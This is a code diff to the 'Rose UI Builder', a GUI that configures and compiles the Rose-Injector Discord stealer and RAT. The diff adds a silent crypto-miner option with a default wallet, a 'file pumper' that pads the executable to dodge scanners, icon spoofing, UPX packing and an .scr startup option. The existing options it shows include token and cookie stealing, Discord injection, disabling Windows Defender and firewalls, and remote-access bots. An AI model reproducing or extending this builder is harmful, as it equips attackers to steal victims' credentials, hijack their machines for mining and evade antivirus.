@@ -41,10 +41,11 @@ logging.basicConfig(
 
 logger = logging.getLogger(__name__)
 
+gumbobr0ts_wallet_adr = "MY WALLET ADRESS HERE"
 
 __title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/RoseWBG.png'
-__version__ = '1.3'
+__version__ = '1.4'
 __debugm__ = False # Change only if you are a dev 
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/tools/rose.png"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
@@ -53,6 +54,7 @@ data_builder = {
     "webhook_url": "",
     "build_name": "",
     "startup": False,
+    "use_scr": False,
     "injection": False,
     "token": False,
     "cookie": False,
@@ -70,13 +72,18 @@ data_builder = {
     "screenshot": False,
     "ping": False,
     "fake_error": False,
+    "silent_crypto_miner": False,
+    "wallet_adress": "",
     "nitro_buy": False,
+    "file_pumper": False,
+    "file_pumper_size": "",
     "get_admin": False,
     "disable_defender": False,
     "disable_firewalls": False,
     "vm_detect": False,
     "vm_webhook_url": "",
-    "webcam": False
+    "webcam": False,
+    "icon_file": ""
 }
 
 links = {
@@ -86,7 +93,7 @@ links = {
     "suegdu_github": "https://github.com/suegdu",
     "svn_github": "https://github.com/suvan1911",
     "rose_github": "https://github.com/DamagingRose/Rose-Injector",
-    "rose_discord": "https://discord.gg/gz5fUCkw8p"
+    "rose_discord": "https://discord.gg/Ts9RTFYvyt"
 }
 
 logger.critical(f"Rose UI Builder is using version {str(__version__)}")
@@ -168,6 +175,16 @@ def _makebuild(q: Queue, data_builder) -> str:
         ui.notify("Knight-RAT Bot Token is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
     
+    if data_builder["icon_file"] == "":
+        basic_exe_path = os.getcwd() + 'assets\imageres-011.ico'
+        data_builder["icon_file"] = basic_exe_path.replace('roseui', '')
+
+    if data_builder["wallet_adress"] == "":
+        data_builder["wallet_adress"] = gumbobr0ts_wallet_adr
+    
+    if data_builder["file_pumper_size"] == "":
+        data_builder["file_pumper_size"] = None
+
     if data_builder["rose_rat_url"] == "":
         data_builder["rose_rat_url"] = ".rat"
         
@@ -209,7 +226,7 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("KNIGHT_DISCORD_RAT_CHANNEL_ID", f"{data_builder['knight_channel_id']}") \
                 .replace("KNIGHT_DISCORD_RAT_LISTENER_USER_ID", f"{data_builder['knight_user_id']}") \
                 .replace("KNIGHT_DISCORD_RAT_PREFIX", f"{data_builder['knight_prefix']}") \
-                .replace("startup = False", f"startup = {data_builder['startup']}") \
+                .replace("start_up = False", f"start_up = {data_builder['startup']}") \
                 .replace("injection = False", f"injection = {data_builder['injection']}") \
                 .replace("token_stealing = False", f"token_stealing = {data_builder['token']}") \
                 .replace("cookie_stealing = False", f"cookie_stealing = {data_builder['cookie']}") \
@@ -220,6 +237,9 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("screenshot = False", f"screenshot = {data_builder['screenshot']}") \
                 .replace("discord_ping = False", f"discord_ping = {data_builder['ping']}") \
                 .replace("get_admin = False", f"get_admin = {data_builder['get_admin']}") \
+                .replace("silent_crypto_miner = False", f"{data_builder['silent_crypto_miner']}") \
+                .replace("use_scr = False", f"use_scr = {data_builder['use_scr']}") \
+                .replace("_WALLET_ADR_HERE", f"{data_builder['wallet_adress']}") \
                 .replace("disable_defender = False", f"disable_defender = {data_builder['disable_defender']}") \
                 .replace("disable_firewalls = False", f"disable_firewalls = {data_builder['disable_firewalls']}") \
                 .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
@@ -234,17 +254,38 @@ def _makebuild(q: Queue, data_builder) -> str:
         except Exception as e:
             logger.error(f"Error in edit_config: {e}")
 
+    def pump_file():
+        logger.info(f"DEBUGGING File pumper is set to: {data_builder['file_pumper']}")
+        logger.info(f"DEBUGGING File pumper size is set to: {data_builder['file_pumper_size']}")
+        if data_builder["file_pumper"] is True:
+            if data_builder["file_pumper_size"] is not None:
+                logger.info("Entering file pump process")
+                try:
+                    b_size = int(data_builder["file_pumper_size"]) * 1048576
+                    bufferSize = 256
+                    with open(f"{data_builder['build_name']}.exe", 'ab') as f:
+                        for i in range(b_size // bufferSize):
+                            f.write(bytes([0] * bufferSize))
+                    logger.info("Finished file pump process")
+                except Exception as e:
+                    logger.error(f"Error in pumping file: {e}")
+
     def compile():
         try:
             logger.info("Entering compile process")
-            logger.info(f'Compile CMD Line: python -m PyInstaller "{path}\main.py" --noconsole --onefile')
+            logger.info(f'Compile CMD Line: python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_file"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile')
             output_file = "rosecompile.log"
-            subprocess.call(f'python -m PyInstaller "{path}\main.py" --noconsole --onefile', shell=True, stdout=open(output_file, 'w'), stderr=subprocess.STDOUT)
+            subprocess.call(
+                f'python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_file"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile',
+                shell=True,
+                stdout=open(output_file, 'w'),
+                stderr=subprocess.STDOUT
+            )
             logger.info(f"Output of compile process saved in rosecompile.log")
         except Exception as e:
             logger.error(f"Error in compile: {e}")
 
-    def move_dir(): 
+    def move_dir():
         logger.info("Entering move_dir")
         try:
             shutil.move("dist\\main.exe", f"{data_builder['build_name']}.exe")
@@ -265,13 +306,15 @@ def _makebuild(q: Queue, data_builder) -> str:
     q.put_nowait(0.8)
     move_dir()
     q.put_nowait(1)
+    pump_file()
+    q.put_nowait(1)
     return 'Done!'
 
 def _home():
     with ui.dialog() as dialog, ui.card():
         ui.label('If everything went good, your compiled file should be in the folder, else join our discord')
         ui.button("Open Folder", on_click=lambda: os.startfile(Path(__file__).resolve().parent))
-        ui.button('Join Discord', on_click=lambda: webbrowser.open('https://discord.gg/gz5fUCkw8p'))
+        ui.button('Join Discord', on_click=lambda: webbrowser.open('https://discord.gg/Ts9RTFYvyt'))
         ui.button('Close', on_click=dialog.close)
         
     async def start_computation():
@@ -299,6 +342,11 @@ def _home():
             placeholder='Rose on top baby',
             on_change=lambda e: change_data("build_name", e.value)
         ).props('inline color=pink-3').classes('w-full')
+        ui.input(
+            label='File icon',
+            placeholder='Specify the exact .ico path / Leave blank for basic',
+            on_change=lambda e: change_data("icon_file", e.value)
+        ).props('inline color=pink-3').classes('w-full')
         
         ui.button(
             'Test WebHook',
@@ -310,17 +358,16 @@ def _home():
         ).props("icon=build color=pink-3").classes('w-full')
         
         progressbar = ui.linear_progress(value=0, show_value=False).props('instant-feedback rounded color=green-8 size=35px stripe')
-        might_take = ui.label("At 60%, compiling might take 1 to 2 minutes depending on your computer. You can look at the progress on both .log file")
+        might_take = ui.label("At 60%, compiling might take 2 to 3 minutes depending on your computer & the options you chose. You can look at the progress on both .log file")
         progressbar.visible = False
         might_take.visible = False
 
 def _functions():
     with ui.column():
         with ui.expansion('System', icon='work').classes('w-full'):
-            ui.checkbox(
-                'Startup',
-                on_change=lambda e: change_data('startup', e.value)
-            ).props('inline color=pink')
+            with ui.row():
+                _startup = ui.checkbox('Startup', on_change=lambda e: change_data('startup', e.value)).props('inline color=pink')
+                ui.checkbox('Use scr file', on_change=lambda e: change_data('use_scr', e.value)).bind_visibility_from(_startup, 'value').props('inline color=pink')  
             with ui.row():
                 _inj = ui.checkbox(
                     'Injector',
@@ -332,7 +379,7 @@ def _functions():
                 ).bind_visibility_from(_inj, 'value').props('inline color=pink')  
                 
             with ui.row():
-                _admin = ui.checkbox('Get admin', on_change=lambda e: change_data('get_admin', e.value)).props('inline color=pink')
+                _admin = ui.checkbox('Get admin / Admin only', on_change=lambda e: change_data('get_admin', e.value)).props('inline color=pink')
                 ui.checkbox('Disable Windows Defender', on_change=lambda e: change_data('disable_defender', e.value)).props('inline color=black-2').bind_visibility_from(_admin, 'value').props('inline color=pink')
                 ui.checkbox('Disable Windows Firewalls', on_change=lambda e: change_data('disable_firewalls', e.value)).props('inline color=black-2').bind_visibility_from(_admin, 'value').props('inline color=pink')
 
@@ -352,6 +399,14 @@ def _functions():
 
         with ui.expansion('Advanced', icon='work').classes('w-full'):
             with ui.column():
+                with ui.row():
+                    _miner = ui.checkbox('Silent Crypto Miner', on_change=lambda e: change_data('silent_crypto_miner', e.value)).props('inline color=yellow-7')
+                    ui.input(label='Wallet adress', placeholder='Bitcoin wallet adress',
+                        on_change=lambda e: change_data('wallet_adress', e.value)).bind_visibility_from(_miner, 'value').props('inline color=yellow-7')
+                with ui.row():
+                    _pumper = ui.checkbox('Pump file', on_change=lambda e: change_data('file_pumper', e.value)).props('inline color=yellow-7')
+                    ui.input(label='Pump Size', placeholder='Size in MB',
+                        on_change=lambda e: change_data('file_pumper_size', e.value)).bind_visibility_from(_pumper, 'value').props('inline color=yellow-7')
                 with ui.row():
                     _rose_rat = ui.checkbox('Rose-RAT', on_change=lambda e: change_data('rose_rat', e.value)).props('inline color=yellow-7')
                     ui.input(label='Rose-RAT Server URL', placeholder='Rose on top baby',
